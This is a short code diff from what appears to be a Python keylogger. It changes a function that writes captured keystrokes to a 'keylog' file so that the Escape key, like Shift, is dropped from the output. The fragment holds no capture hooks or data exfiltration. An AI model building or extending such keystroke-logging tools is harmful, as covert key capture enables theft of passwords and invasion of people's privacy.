@@ -16,7 +16,7 @@ def write_to_file(keys_pressed):
 					if (count >= MAX_CHAR_COUNT):
 						parsed_key = "\n"
 						count = 0
-				elif (key_string == "Key.shift"):
+				elif (key_string == "Key.shift" or key_string == "Key.esc"):
 					parsed_key = ''
 			keylog.write(parsed_key)
 			count += 1
